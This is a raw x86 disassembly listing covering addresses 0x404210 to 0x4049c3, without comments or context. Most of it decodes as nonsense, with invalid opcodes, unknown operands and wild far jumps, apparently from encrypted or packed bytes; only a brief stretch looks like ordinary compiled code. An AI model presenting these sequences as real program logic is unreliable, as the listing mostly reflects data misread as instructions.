  404210:	outs   dx,BYTE PTR es:[esi]
  404212:	mov    BYTE PTR [esi-0x15],dh
  404215:	mov    edi,ss
  404217:	out    dx,al
  404218:	xor    DWORD PTR [ebx],esi
  40421a:	adc    eax,0x28e893b3
  40421f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404220:	ss xchg ebp,eax
  404222:	add    al,al
  404224:	cli    
  404225:	xchg   edi,eax
  404226:	jecxz  0x404296
  404228:	mov    ss,WORD PTR [esi+0x211deb91]
  40422e:	dec    esi
  40422f:	std    
  404230:	or     DWORD PTR [esi-0x77],0xcfce83be
  404237:	aaa    
  404238:	loope  0x40421d
  40423a:	imul   edi,DWORD PTR [edx-0x518e6547],0x78
  404241:	das    
  404242:	aad    0xe6
  404244:	test   eax,0x4be1e1f0
  404249:	add    eax,0xcd2093c8
  40424e:	mov    eax,0xf50851d2
  404253:	lods   eax,DWORD PTR ds:[esi]
  404254:	arpl   WORD PTR [ebp+ebp*8+0x6e],dx
  404258:	not    DWORD PTR [ebp+0x17]
  40425b:	adc    al,0xe6
  40425d:	dec    ecx
  40425e:	mov    esi,ebx
  404260:	or     al,0xb7
  404262:	or     bl,BYTE PTR [ecx]
  404264:	dec    ecx
  404265:	jne    0x4042d3
  404267:	ins    DWORD PTR es:[edi],dx
  404268:	cli    
  404269:	pop    es
  40426a:	add    al,0xe5
  40426c:	dec    esp
  40426d:	mov    ah,0x52
  40426f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404270:	sub    DWORD PTR [edi-0x4432e936],esp
  404276:	pushf  
  404277:	jmp    0x404210
  404279:	pop    es
  40427a:	jmp    0x404237
  40427c:	div    BYTE PTR [edi-0x71]
  40427f:	iret   
  404280:	mov    BYTE PTR [esi],0x69
  404283:	sub    eax,0x27920b56
  404288:	push   ss
  404289:	and    eax,0x9fdc0f8b
  40428e:	fs sub al,0xfa
  404291:	push   edi
  404292:	ds jg  0x40424e
  404295:	mov    ecx,0xed4af913
  40429a:	jns    0x4042ba
  40429c:	inc    eax
  40429d:	mov    esi,0x4a0d6a30
  4042a2:	jb     0x40430d
  4042a4:	inc    edi
  4042a5:	pop    ebp
  4042a6:	jle    0x404273
  4042a8:	adc    BYTE PTR [eax],dl
  4042aa:	dec    edx
  4042ab:	repnz ficom DWORD PTR [edi+eax*1]
  4042af:	mov    bl,0x63
  4042b1:	sub    cl,BYTE PTR [ebx]
  4042b3:	outs   dx,DWORD PTR ds:[esi]
  4042b4:	pushf  
  4042b5:	ror    BYTE PTR [ecx-0x247e27bb],0x67
  4042bc:	(bad)  
  4042bd:	pop    es
  4042be:	mov    ds:0xe04ea27a,eax
  4042c3:	loop   0x404325
  4042c5:	dec    ax
  4042c7:	vpcmpeqb ymm3,ymm1,YMMWORD PTR [ebp-0x28e6e4d]
  4042cf:	icebp  
  4042d0:	test   BYTE PTR [edx+0x6],ah
  4042d3:	and    edi,DWORD PTR [ecx+0xd5318a4]
  4042d9:	push   0x9785596e
  4042de:	in     al,dx
  4042df:	sub    ebx,DWORD PTR [edi]
  4042e1:	sub    dh,0x10
  4042e4:	dec    ecx
  4042e5:	outs   dx,BYTE PTR ds:[esi]
  4042e6:	and    DWORD PTR [ecx-0x44],0xffffff81
  4042ea:	daa    
  4042eb:	es aad 0x76
  4042ee:	inc    edi
  4042ef:	mov    ds,eax
  4042f1:	or     esi,DWORD PTR [esi+ebx*2]
  4042f4:	mov    ebp,?
  4042f6:	jecxz  0x40434c
  4042f8:	mov    ds:0x3fbce5b1,al
  4042fd:	shl    BYTE PTR [ebp-0x79],0xed
  404301:	cmp    bl,BYTE PTR [edx]
  404303:	push   ecx
  404304:	es gs addr16 mov edi,esp
  404309:	pop    edx
  40430a:	dec    esp
  40430b:	lods   al,BYTE PTR ds:[esi]
  40430c:	adc    BYTE PTR [esi],0x30
  40430f:	mov    edx,0xa2814437
  404314:	add    eax,0xf5dfc65
  404319:	and    DWORD PTR [eax],ebp
  40431b:	iret   
  40431c:	out    dx,eax
  40431d:	jmp    0xeca5:0xdafaec3d
  404324:	cmp    BYTE PTR [edx],bh
  404326:	cmp    ch,dl
  404328:	fcmovnu st,st(4)
  40432a:	add    al,0x49
  40432c:	rol    DWORD PTR [esi+0x3adf4fc],0x1e
  404333:	js     0x404321
  404335:	mov    ds:0xe55101e1,eax
  40433a:	ret    
  40433b:	stc    
  40433c:	sub    al,0xe0
  40433e:	or     al,0x29
  404340:	adc    DWORD PTR [ebp+0x5a],esi
  404343:	fisttp WORD PTR [eax+0xd]
  404346:	iret   
  404347:	repz cwde 
  404349:	popf   
  40434a:	jl     0x4043b8
  40434c:	ret    
  40434d:	xor    DWORD PTR [esi+0x3e],eax
  404350:	adc    BYTE PTR [esi],ch
  404352:	jmp    0x4043c7
  404354:	dec    edx
  404355:	aas    
  404356:	add    BYTE PTR [ebx+0x60],cl
  404359:	ins    DWORD PTR es:[edi],dx
  40435a:	sti    
  40435b:	push   eax
  40435c:	popf   
  40435d:	outs   dx,BYTE PTR ds:[esi]
  40435e:	jns    0x40436e
  404360:	int    0x1b
  404362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404363:	mov    edi,0xcd12cea1
  404368:	xor    al,0xe6
  40436a:	mov    dl,0x73
  40436c:	mov    ebp,DWORD PTR [eax]
  40436e:	xchg   ecx,eax
  40436f:	cmp    esp,DWORD PTR [edx-0x35487507]
  404375:	dec    ecx
  404376:	add    al,0x38
  404378:	sti    
  404379:	add    BYTE PTR [eax],ah
  40437b:	imul   esi,DWORD PTR [edi],0x45b17762
  404381:	scas   eax,DWORD PTR es:[edi]
  404382:	inc    ebp
  404383:	fidiv  DWORD PTR [edi-0xe]
  404386:	push   ss
  404387:	jae    0x404342
  404389:	add    BYTE PTR [ebp+eax*2-0x54bdde3d],bh
  404390:	cmp    DWORD PTR [eax],eax
  404392:	sub    edx,esp
  404394:	push   ebx
  404395:	mov    ebx,0x80e4dd3d
  40439a:	test   cl,dh
  40439c:	sub    eax,0x3d37747f
  4043a1:	xlat   BYTE PTR ds:[ebx]
  4043a2:	enter  0x3fc1,0x99
  4043a6:	jecxz  0x40438c
  4043a8:	mov    al,ds:0x96af4141
  4043ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ae:	(bad)  
  4043af:	call   0x6f14198d
  4043b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043b5:	mov    ch,0xf
  4043b7:	out    0x26,eax
  4043b9:	lods   eax,DWORD PTR ds:[esi]
  4043ba:	pop    ds
  4043bb:	loopne 0x4043f6
  4043bd:	scas   al,BYTE PTR es:[edi]
  4043be:	or     ebp,DWORD PTR [edi+0x2021e6e5]
  4043c4:	in     al,0x94
  4043c6:	xchg   ebx,eax
  4043c7:	imul   esp,DWORD PTR [ebx],0xad5cb42e
  4043cd:	enter  0x5f7,0xdf
  4043d1:	cmp    BYTE PTR [ebx],0xe
  4043d4:	mov    dl,0xbf
  4043d6:	les    edi,FWORD PTR [ebx+ecx*4]
  4043d9:	mov    esp,0xe7273e9a
  4043de:	js     0x4043fb
  4043e0:	stos   BYTE PTR es:[edi],al
  4043e1:	push   ecx
  4043e2:	mov    ecx,0xc2e381f6
  4043e7:	inc    edx
  4043e8:	out    dx,eax
  4043e9:	jo     0x4043b6
  4043eb:	iret   
  4043ec:	test   eax,0x8cdef10d
  4043f1:	mov    edx,0x8c99d6c2
  4043f6:	sahf   
  4043f7:	xchg   esp,eax
  4043f8:	mov    edi,0x1b9eb221
  4043fd:	mov    al,ds:0x756eff67
  404402:	outs   dx,DWORD PTR ds:[esi]
  404403:	xchg   al,dl
  404405:	sbb    eax,DWORD PTR [ecx]
  404407:	sbb    eax,0xfbed3cc3
  40440c:	mov    bl,BYTE PTR [esi-0x79d055a7]
  404412:	iret   
  404413:	dec    esi
  404414:	jnp    0x404452
  404416:	scas   al,BYTE PTR es:[edi]
  404417:	push   ds
  404418:	cmp    BYTE PTR [edx],bh
  40441a:	out    0x71,eax
  40441c:	cs pop ebx
  40441e:	mov    ds:0x83712ab5,eax
  404423:	sub    BYTE PTR [edi-0x2efc993e],0xac
  40442a:	or     al,0x0
  40442c:	or     al,0x8d
  40442e:	sbb    ch,bh
  404430:	icebp  
  404431:	ret    
  404432:	or     DWORD PTR [ebp-0x42e04c15],esi
  404438:	mov    ecx,esp
  40443a:	iret   
  40443b:	fldenv [eax+0x5c8cee19]
  404441:	pop    ecx
  404442:	adc    al,0xd1
  404444:	lds    edx,FWORD PTR [esi]
  404446:	jnp    0x404464
  404448:	pusha  
  404449:	mov    esp,0x6f47045a
  40444e:	sbb    ah,dh
  404450:	inc    edi
  404451:	or     ebp,DWORD PTR [ecx+0x4f]
  404454:	in     eax,0x4b
  404456:	loopne 0x404424
  404458:	aas    
  404459:	jns    0x4044c0
  40445b:	loopne 0x404469
  40445d:	mov    edx,0x9efc0f8d
  404462:	push   eax
  404463:	mov    bl,0xb5
  404465:	lea    eax,[ecx+0x49]
  404468:	scas   al,BYTE PTR es:[edi]
  404469:	sbb    eax,0xab3105a0
  40446e:	ins    DWORD PTR es:[edi],dx
  40446f:	sbb    bh,BYTE PTR [esi+0x6e9eaa9b]
  404475:	popf   
  404476:	sub    al,0x50
  404478:	cmp    eax,0x33a27d74
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044e1
  404490:	retf   
  404491:	sbb    al,0x4c
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x40449f
  40449c:	jnp    0x404493
  40449e:	outs   dx,DWORD PTR ds:[esi]
  40449f:	scas   al,BYTE PTR es:[edi]
  4044a0:	mov    ebp,DWORD PTR [ebx-0x6a]
  4044a3:	jb     0x40442f
  4044a5:	sbb    ah,BYTE PTR [esi]
  4044a7:	(bad)  
  4044a8:	cmc    
  4044a9:	inc    esp
  4044aa:	stc    
  4044ab:	inc    eax
  4044ac:	ja     0x404514
  4044ae:	aas    
  4044af:	fsub   st(5),st
  4044b1:	dec    ebx
  4044b2:	mov    bh,0x9
  4044b4:	add    al,0x77
  4044b6:	push   ebp
  4044b7:	jne    0x404440
  4044b9:	mov    ebx,0x849bab3d
  4044be:	stos   BYTE PTR es:[edi],al
  4044bf:	scas   al,BYTE PTR es:[edi]
  4044c0:	mov    DWORD PTR [edx],esp
  4044c2:	shr    ch,0xec
  4044c5:	jo     0x4044f2
  4044c7:	out    0x35,eax
  4044c9:	(bad)  
  4044ca:	dec    eax
  4044cb:	bound  edi,QWORD PTR [edx+0x440ae2f2]
  4044d1:	lea    edi,[ebx]
  4044d3:	xchg   edi,eax
  4044d4:	aaa    
  4044d5:	sbb    ah,cl
  4044d7:	mov    esp,0x97934285
  4044dc:	cmp    cl,BYTE PTR [ebx+0x62e3c32a]
  4044e2:	sbb    al,0xde
  4044e4:	mov    bl,0xcc
  4044e6:	push   ebp
  4044e7:	cmp    ch,BYTE PTR ds:0x26230134
  4044ed:	dec    edx
  4044ee:	in     eax,0xd1
  4044f0:	(bad)  
  4044f1:	cmp    bh,BYTE PTR [ebx+0x2f]
  4044f4:	loop   0x404520
  4044f6:	mov    al,0x30
  4044f8:	hlt    
  4044f9:	test   DWORD PTR [eax-0x50876062],ecx
  4044ff:	in     eax,0xa9
  404501:	pop    edx
  404502:	sbb    bh,0xd9
  404505:	js     0x404501
  404507:	mov    ch,0x8a
  404509:	popf   
  40450a:	lea    ebx,[esi+0x44]
  40450d:	loope  0x404561
  40450f:	dec    esi
  404510:	sbb    eax,edi
  404512:	xchg   esp,eax
  404513:	sub    ecx,ebx
  404515:	and    edi,DWORD PTR [ebx+0x76f56cc5]
  40451b:	and    DWORD PTR [edi-0x4e2ef999],ebp
  404521:	xchg   esi,eax
  404522:	jl     0x4044bf
  404524:	pushf  
  404525:	or     bl,BYTE PTR [ebx+0x381f214b]
  40452b:	inc    edx
  40452c:	add    al,0x5f
  40452e:	(bad)  
  404530:	inc    esi
  404531:	push   eax
  404532:	pop    ss
  404533:	repnz test DWORD PTR [eax+0x26],0xc3443b45
  40453b:	not    BYTE PTR [ecx]
  40453d:	scas   eax,DWORD PTR es:[edi]
  40453e:	sub    eax,0xfd54293b
  404543:	fnstcw WORD PTR [eax-0x25]
  404546:	lahf   
  404547:	push   ebx
  404548:	cs cli 
  40454a:	jns    0x40459f
  40454c:	mov    edx,ds
  40454e:	xor    ecx,DWORD PTR [ebx+0x63287c10]
  404554:	mov    cl,0x97
  404556:	and    DWORD PTR [esi+0x78],0x2b
  40455a:	(bad)  
  40455b:	mov    WORD PTR [ecx-0x1ee716b9],ss
  404561:	fnsave [edx+0x6c272221]
  404567:	sub    ecx,DWORD PTR [edi-0x6e322339]
  40456d:	fnstcw WORD PTR ds:0x5c4e0042
  404573:	cmp    cl,BYTE PTR [eax+0x4]
  404576:	js     0x40457c
  404578:	jnp    0x40452a
  40457a:	lahf   
  40457b:	and    ecx,ebp
  40457d:	mov    db2,esi
  404580:	mov    al,0x1a
  404582:	jmp    FWORD PTR [eax+0x3e]
  404585:	mov    ds:0x4b4af67c,al
  40458a:	inc    eax
  40458b:	adc    al,0x91
  40458d:	adc    DWORD PTR [ecx+0x73],0x12
  404591:	test   DWORD PTR [edx+0x7a],ecx
  404594:	inc    ecx
  404595:	xor    ah,BYTE PTR [ecx-0x56d867c8]
  40459b:	push   ebx
  40459c:	aas    
  40459d:	lahf   
  40459e:	xchg   DWORD PTR [ecx-0x2c],eax
  4045a1:	frndint 
  4045a3:	mov    esp,0x87445b1b
  4045a8:	(bad)  
  4045a9:	into   
  4045aa:	cmp    BYTE PTR ds:0xfe5f98b9,dh
  4045b0:	xor    eax,0x2b64ee8a
  4045b5:	inc    esp
  4045b6:	pop    ss
  4045b7:	je     0x40462f
  4045b9:	in     eax,dx
  4045ba:	sbb    al,0x97
  4045bc:	in     eax,0xce
  4045be:	lods   eax,DWORD PTR ds:[esi]
  4045bf:	out    dx,al
  4045c0:	pop    edi
  4045c1:	sub    dl,bh
  4045c3:	inc    ebp
  4045c4:	nop
  4045c5:	jns    0x4045af
  4045c7:	lea    esi,[eax]
  4045c9:	push   cs
  4045ca:	add    eax,0xa8cfb5c
  4045cf:	aad    0xca
  4045d1:	sbb    BYTE PTR ds:[edi],0x70
  4045d5:	stos   DWORD PTR es:[edi],eax
  4045d6:	cmp    al,0xd0
  4045d8:	and    bh,bh
  4045da:	stos   DWORD PTR es:[edi],eax
  4045db:	adc    eax,0xc8bab15f
  4045e0:	rcl    DWORD PTR [edx-0x50f10371],1
  4045e6:	or     al,0x46
  4045e8:	jo     0x404662
  4045ea:	mov    ecx,0x42d39153
  4045ef:	xchg   edx,eax
  4045f0:	(bad)  
  4045f1:	pushf  
  4045f2:	mov    ds:0x59fe72e4,eax
  4045f7:	ins    BYTE PTR es:[edi],dx
  4045f8:	xchg   DWORD PTR [edx+ecx*2],ebx
  4045fb:	lods   eax,DWORD PTR ds:[esi]
  4045fc:	ror    BYTE PTR [eax],0xb4
  4045ff:	sub    bl,BYTE PTR [ebx-0x4c]
  404602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404603:	inc    ebx
  404604:	jg     0x4045a8
  404606:	or     al,0x95
  404608:	out    dx,al
  404609:	frstor [eax-0x77385d00]
  40460f:	mov    ch,BYTE PTR [ecx+0x9d246e7]
  404615:	leave  
  404616:	stc    
  404617:	inc    ecx
  404618:	adc    ecx,DWORD PTR [edx-0x4a]
  40461b:	inc    ebx
  40461c:	xchg   edi,eax
  40461d:	add    BYTE PTR [esi+0x1e],bl
  404620:	dec    edi
  404621:	and    edi,DWORD PTR [esi]
  404623:	adc    edx,DWORD PTR [esi]
  404625:	mov    esp,0x790b665a
  40462a:	sub    DWORD PTR [eax],edi
  40462c:	cmp    BYTE PTR [ebp-0x5d8fadd5],0xc5
  404633:	fwait
  404634:	cmp    eax,0xdd45cd78
  404639:	pop    edx
  40463a:	push   esp
  40463b:	iret   
  40463c:	int    0x77
  40463e:	mov    esi,0x693ca1f2
  404643:	leave  
  404644:	mov    eax,ds:0xc5c80e44
  404649:	lods   eax,DWORD PTR ds:[esi]
  40464a:	mov    eax,ebp
  40464c:	push   edx
  40464d:	mov    dh,0x2
  40464f:	pop    ds
  404650:	bound  edx,QWORD PTR [edx+0x3558edfc]
  404656:	xchg   ecx,eax
  404657:	not    DWORD PTR [edx-0x73b2585b]
  40465d:	inc    BYTE PTR [ebp+0x2f]
  404660:	lods   al,BYTE PTR ds:[esi]
  404661:	add    ecx,DWORD PTR [ebp-0x69]
  404664:	pop    ecx
  404665:	imul   DWORD PTR [ecx-0x7d4c8738]
  40466b:	ins    BYTE PTR es:[edi],dx
  40466c:	popa   
  40466d:	pop    edx
  40466e:	jae    0x4046b5
  404670:	ds cli 
  404672:	jg     0x40465a
  404674:	cmp    ah,BYTE PTR [ecx-0x6d]
  404677:	jne    0x4046cd
  404679:	mov    al,0xc5
  40467b:	inc    eax
  40467c:	inc    esi
  40467d:	xor    DWORD PTR [edx+eiz*4-0x49c82633],eax
  404684:	loopne 0x404635
  404686:	lods   al,BYTE PTR ds:[esi]
  404687:	pushf  
  404688:	lock cmovs edi,edx
  40468c:	lods   eax,DWORD PTR ss:[esi]
  40468e:	push   ebp
  40468f:	inc    esi
  404690:	xchg   edx,eax
  404691:	or     al,0xf4
  404693:	pop    ebx
  404694:	(bad)  
  404695:	(bad)  
  404696:	jo     0x40464a
  404698:	xchg   esp,eax
  404699:	cs inc eax
  40469b:	mov    WORD PTR [edi-0x5006d75c],ds
  4046a1:	les    esi,FWORD PTR [ebx+0xa]
  4046a4:	dec    ecx
  4046a5:	xchg   BYTE PTR [esi-0x684decbd],ch
  4046ab:	pop    ss
  4046ac:	fild   DWORD PTR [esi*4-0x4bf1778a]
  4046b3:	push   ebp
  4046b4:	stos   DWORD PTR es:[edi],eax
  4046b5:	add    cl,ah
  4046b7:	fs enter 0x2c9a,0x7d
  4046bc:	mov    edx,0x508cd039
  4046c1:	or     eax,eax
  4046c3:	ss jle 0x4046b0
  4046c6:	gs push esp
  4046c8:	test   DWORD PTR [eax+0x51],0x881c93ca
  4046cf:	mov    cl,0xb2
  4046d1:	cmp    al,BYTE PTR [eax]
  4046d3:	inc    ecx
  4046d4:	ins    BYTE PTR es:[edi],dx
  4046d5:	loopne 0x404679
  4046d7:	ja     0x40466c
  4046d9:	lds    esp,FWORD PTR gs:[eax+0x63]
  4046dd:	(bad)  
  4046de:	out    dx,eax
  4046df:	jmp    0x4ffe:0x4cc1a324
  4046e6:	xor    al,BYTE PTR [esi]
  4046e8:	call   0xdc09:0x861ff277
  4046ef:	xchg   ebx,eax
  4046f0:	dec    edx
  4046f1:	push   esi
  4046f2:	retf   0x21bc
  4046f5:	pop    ds
  4046f6:	out    0x97,eax
  4046f8:	add    al,BYTE PTR [esi-0x7e]
  4046fb:	fs repz mov ch,0xc8
  4046ff:	mov    dh,0x9d
  404701:	mov    al,ds:0x54faff83
  404706:	fmul   st,st(0)
  404708:	mov    ds:0x3e489b86,eax
  40470d:	adc    ebx,DWORD PTR [edi]
  40470f:	adc    dh,BYTE PTR [edi+0x4e891bf7]
  404715:	push   esp
  404716:	ja     0x4046bb
  404718:	mov    dl,0x3d
  40471a:	aaa    
  40471b:	mov    dh,0xfe
  40471d:	jb     0x404760
  40471f:	cld    
  404720:	pop    edx
  404721:	mov    ds:0x4266bf30,al
  404726:	(bad)
  40472a:	loop   0x404767
  40472c:	in     al,0x70
  40472e:	jmp    0x404781
  404730:	dec    ebx
  404731:	shrd   WORD PTR [edx+0x16a50c6c],bx,cl
  404739:	out    0xc9,al
  40473b:	outs   dx,DWORD PTR ds:[esi]
  40473c:	xchg   esp,eax
  40473d:	mov    dl,0xb2
  40473f:	sti    
  404740:	xchg   DWORD PTR [ebx+0x6f],ecx
  404743:	adc    eax,DWORD PTR [esi+0x8]
  404746:	aas    
  404747:	lock cmc 
  404749:	mov    dl,0x1
  40474b:	lods   al,BYTE PTR ds:[esi]
  40474c:	mov    edx,0x86c36e60
  404752:	and    al,0xf1
  404754:	pushw  cs
  404756:	pop    esp
  404757:	mov    ebp,0x8b54c73a
  40475c:	adc    bl,BYTE PTR [ebx-0x3d]
  40475f:	iret   
  404760:	lahf   
  404761:	mov    eax,ds:0xf2edf713
  404766:	les    edi,FWORD PTR [edx-0x25]
  404769:	mov    ds,WORD PTR [eax+0x71]
  40476c:	mov    ds:0x4cc09d6f,eax
  404771:	mov    WORD PTR [eax-0x54669476],es
  404777:	ds pushf 
  404779:	(bad)  
  40477a:	xor    ch,BYTE PTR [edi]
  40477c:	add    al,0x40
  40477e:	sbb    ebp,DWORD PTR [edi+0x3d033e0]
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	out    0xc2,al
  4047b6:	into   
  4047b7:	and    eax,0x7e7e27b8
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x40481e
  4047c1:	push   0xcff93e3b
  4047c6:	xchg   ecx,eax
  4047c7:	cwde   
  4047c8:	rol    bh,0xa1
  4047cb:	int3   
  4047cc:	or     DWORD PTR [ebx],edi
  4047ce:	xor    dl,BYTE PTR [esi+0x3a012bcc]
  4047d4:	loop   0x40475a
  4047d6:	mov    edx,0xf85c8493
  4047db:	add    bl,BYTE PTR ds:0x2cb180e4
  4047e1:	rol    bl,0x6a
  4047e4:	das    
  4047e5:	jg     0x4047ff
  4047e7:	mov    bl,0x37
  4047e9:	xchg   DWORD PTR [eax+0x29],ecx
  4047ec:	sbb    BYTE PTR [edx+0x76efa990],dh
  4047f2:	push   0x7192d69a
  4047f7:	hlt    
  4047f8:	xor    ebp,esi
  4047fa:	jae    0x404840
  4047fc:	cld    
  4047fd:	mov    al,0x7
  4047ff:	pusha  
  404800:	outs   dx,BYTE PTR ds:[esi]
  404801:	push   cs
  404802:	cmp    BYTE PTR [edi-0x7cc49c42],0x69
  404809:	push   0xffffffa7
  40480b:	ins    BYTE PTR es:[edi],dx
  40480c:	jo     0x404871
  40480e:	jecxz  0x4047eb
  404810:	inc    ebx
  404811:	xchg   ebp,eax
  404812:	lock sbb al,ah
  404815:	push   0x1f709381
  40481a:	push   ds
  40481b:	mov    edi,0x375d5c86
  404820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404821:	sbb    al,0x8
  404823:	shr    DWORD PTR gs:[esi],0xda
  404827:	and    DWORD PTR [ecx-0x6f42c4f3],edi
  40482d:	pusha  
  40482e:	xlat   BYTE PTR ds:[ebx]
  40482f:	(bad)  
  404831:	hlt    
  404832:	(bad)  
  404833:	lods   eax,DWORD PTR ds:[esi]
  404834:	dec    esi
  404835:	shr    DWORD PTR [ebp-0x7],0x7a
  404839:	mov    eax,0x7a8838f2
  40483e:	mov    WORD PTR [edx+0x54],gs
  404841:	enter  0xc9bf,0x1f
  404845:	pop    ss
  404846:	outs   dx,DWORD PTR ds:[esi]
  404847:	xchg   esp,eax
  404848:	or     DWORD PTR [ebp+0x0],ebx
  40484b:	xor    BYTE PTR [edi+ebx*8-0x26],0xaa
  404850:	xchg   esp,eax
  404851:	in     eax,dx
  404852:	stos   DWORD PTR es:[edi],eax
  404853:	in     al,0x37
  404855:	retf   
  404856:	and    ah,BYTE PTR [ecx+0x4a16e94]
  40485c:	inc    esi
  40485d:	adc    ecx,esp
  40485f:	cdq    
  404860:	mov    al,0x7f
  404862:	jnp    0x4047f5
  404864:	sub    dh,dh
  404866:	in     al,dx
  404867:	lods   eax,DWORD PTR ds:[esi]
  404868:	loop   0x404858
  40486a:	adc    DWORD PTR [ebx-0x1],edi
  40486d:	jmp    0x9d31:0x28d1fd70
  404874:	loope  0x40489d
  404876:	enter  0x74eb,0x79
  40487a:	lock pop edi
  40487c:	and    BYTE PTR [eax-0x70],cl
  40487f:	sbb    esi,DWORD PTR [ebp-0x18]
  404882:	movd   mm5,DWORD PTR [eax]
  404885:	int3   
  404886:	bound  esp,QWORD PTR ss:[eax+0x3b]
  40488a:	dec    ebp
  40488b:	adc    DWORD PTR [esi+0x5],eax
  40488e:	cmc    
  40488f:	aam    0xd
  404891:	sub    BYTE PTR [edi-0x22],al
  404894:	dec    edx
  404895:	push   ecx
  404896:	lds    edx,FWORD PTR [ebx+0x1b]
  404899:	loop   0x4048b8
  40489b:	add    ebx,DWORD PTR [edx-0x19]
  40489e:	ins    DWORD PTR es:[edi],dx
  40489f:	inc    ecx
  4048a0:	and    bl,bh
  4048a2:	dec    ebp
  4048a3:	call   FWORD PTR [edi]
  4048a5:	inc    ebx
  4048a6:	sti    
  4048a7:	arpl   WORD PTR [bp+si],di
  4048aa:	inc    ebp
  4048ab:	div    BYTE PTR [ebx]
  4048ad:	aas    
  4048ae:	fwait
  4048af:	dec    edi
  4048b0:	jle    0x40485b
  4048b2:	dec    esp
  4048b3:	or     BYTE PTR [ebp-0x7eaef4eb],dl
  4048b9:	adc    cl,BYTE PTR [eax]
  4048bb:	fldcw  WORD PTR ds:0xf42daceb
  4048c1:	inc    esi
  4048c2:	fisub  WORD PTR [edi-0x3cd2a7d7]
  4048c8:	adc    al,0x6f
  4048ca:	ins    BYTE PTR es:[edi],dx
  4048cb:	jae    0x404895
  4048cd:	push   esp
  4048ce:	fstp   TBYTE PTR [esi+edx*8-0x46]
  4048d2:	(bad)  
  4048d4:	or     BYTE PTR [edi],0xb6
  4048d7:	cwde   
  4048d8:	mul    DWORD PTR [esi+edi*2-0x62]
  4048dc:	std    
  4048dd:	mov    esp,0x926836a7
  4048e2:	repnz std 
  4048e4:	adc    al,0x19
  4048e6:	cli    
  4048e7:	loopne 0x4048e5
  4048e9:	lea    ebp,[edx]
  4048eb:	clc    
  4048ec:	mov    esp,0xd273eed7
  4048f1:	jbe    0x40491e
  4048f3:	iret   
  4048f4:	imul   ecx,ecx,0x2c
  4048f7:	mov    ds:0xce769187,al
  4048fc:	jmp    0x9d047ab3
  404901:	cmp    al,0xca
  404903:	rol    DWORD PTR [edx+edx*4-0x61],1
  404907:	jno    0x40494a
  404909:	adc    esp,edx
  40490b:	push   ebp
  40490c:	inc    ecx
  40490d:	aaa    
  40490e:	retf   
  40490f:	inc    ecx
  404910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404911:	dec    edi
  404912:	cli    
  404913:	pushf  
  404914:	mov    ?,WORD PTR [eax+edx*8-0x38314d7e]
  40491b:	jns    0x40493e
  40491d:	add    bh,ah
  40491f:	sti    
  404920:	pop    es
  404921:	mov    ds:0x1d13f722,al
  404926:	sub    eax,0x748a82db
  40492b:	pop    edi
  40492c:	scas   al,BYTE PTR es:[edi]
  40492d:	sti    
  40492e:	cmp    bl,BYTE PTR ds:0x1f39da31
  404934:	mov    edi,ss
  404936:	daa    
  404937:	xor    eax,0x490c22d6
  40493c:	sbb    BYTE PTR [ecx-0x677445ef],ch
  404942:	es jns 0x40494a
  404945:	es jb  0x40492d
  404948:	lods   eax,DWORD PTR ds:[esi]
  404949:	jns    0x404913
  40494b:	lods   eax,DWORD PTR ds:[esi]
  40494c:	add    ecx,DWORD PTR [ebp-0xc128622]
  404952:	adc    al,0x86
  404954:	pop    edi
  404955:	data16 add ch,ch
  404958:	xor    DWORD PTR gs:[eax+0x47fa8483],edi
  40495f:	cld    
  404960:	or     edx,DWORD PTR [ebx]
  404962:	stos   BYTE PTR es:[edi],al
  404963:	repnz cmp DWORD PTR [esp+edx*1-0x516ec805],edi
  40496b:	stc    
  40496c:	and    al,0xf
  40496e:	icebp  
  40496f:	std    
  404970:	and    BYTE PTR [edi],bh
  404972:	fstp   st(2)
  404974:	add    edi,DWORD PTR [ebx-0x5b]
  404977:	mov    DWORD PTR [edx+0x5c],edi
  40497a:	add    edi,eax
  40497c:	daa    
  40497d:	mov    ch,0x2d
  40497f:	dec    esp
  404980:	jl     0x404990
  404982:	inc    esi
  404983:	into   
  404984:	lea    edx,[edx]
  404986:	leave  
  404987:	adc    ebx,DWORD PTR [eax-0x51b518ec]
  40498d:	gs mov edi,0x3e14ad58
  404993:	xlat   BYTE PTR ds:[ebx]
  404994:	aam    0xe7
  404996:	aaa    
  404997:	inc    ecx
  404998:	push   ds
  404999:	frstor ds:0x40cd9a02
  40499f:	test   BYTE PTR ds:0x9a2adfc2,0x96
  4049a6:	jmp    0xed8:0x854ad5d8
  4049ad:	pop    esp
  4049ae:	mov    BYTE PTR [eax],bl
  4049b0:	jo     0x40493a
  4049b2:	stc    
  4049b3:	sahf   
  4049b4:	mov    DWORD PTR [edx],ebx
  4049b6:	lods   eax,DWORD PTR ds:[esi]
  4049b7:	inc    edx
  4049b8:	pop    eax
  4049b9:	scas   eax,DWORD PTR es:[edi]
  4049ba:	and    bl,ch
  4049bc:	pop    edx
  4049bd:	dec    esi
  4049be:	add    DWORD PTR [eax],edi
  4049c0:	lock test al,0xa7
  4049c3:	push   esp
